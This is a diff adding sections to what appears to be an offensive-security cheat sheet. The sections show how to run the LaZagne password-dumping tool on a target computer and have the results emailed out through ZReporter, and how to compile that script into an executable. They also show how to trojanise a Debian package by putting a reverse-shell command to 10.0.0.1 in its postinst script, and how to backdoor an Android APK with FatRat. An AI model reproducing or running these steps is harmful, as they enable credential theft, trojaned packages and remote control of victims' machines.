@@ -304,6 +304,74 @@ chmod +x LaZange
 ./LaZange --help
 ./LaZange all
 ```
+- ZReporter
+https://github.com/z00z/ZReporter  
+The idea of the script is, it will allow you to run any UNIX based command on the target computer.
+It will execute that command and send you the result by email.  
+So using the script we'll be able to download LaZange,
+execute it and then get the results on our email.
+```
+edit this and enable less secure application on the email
+COMMAND = "cd /tmp/ && wget -q [URL] && chmod +x LaZange && ./LaZange all" 
+EMAIL = "name@gmail.com"
+PASSWORD = "password"
+```
+you can see that your username and password can be read in plain text in this script.
+So what we wanna do is we want to compile this file to an executable.
+To do that we're gonna use the tool called PI installer
+```
+pip install pyinstaller
+pyinstaller --onefile ZReporter.py
+```
+on targer linux pc
+```
+chmod +x ZReporter
+./ZReporter
+```
+- Embedding Evil Code In A Legitimate Linux Package
+Download a .deb file  
+https://packages.ubuntu.com/  
+extract Files  
+```
+dpkg -x file.deb dir_to_extract_data
+```
+extract Control Paquets
+```
+ar -x file.deb 
+```
+open the control file it generates a control directory  
+We need the control file and postinst file if we dont have the postinst we can create it later  
+------  
+go to dir_to_extract_data  
+create New dir call DEBIAN  
+paste the control and postinst file  
+we put the evil code in postinst file 
+```
+#!/bin/bash
+
+sudo bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+save the postinst file and make it executable
+```
+chmod 755 postinst
+```
+generate the .deb file
+```
+dpkg-deb --build dir_to_extract_data
+```
+
+## Backdooring a Legitimate Android App
+Download a .apk
+Configur Kali to use Java 8
+```
+update-alternatives --config java
+```
+Select the java 8
+Generate the backdoor using FatRat
+```
+5) Backdooring Original apk
+fill options and put the path to the .apk file
+```
 
 ## Mac OSX Malware
 Fat Rat and Empire can both generate OSX payloads.
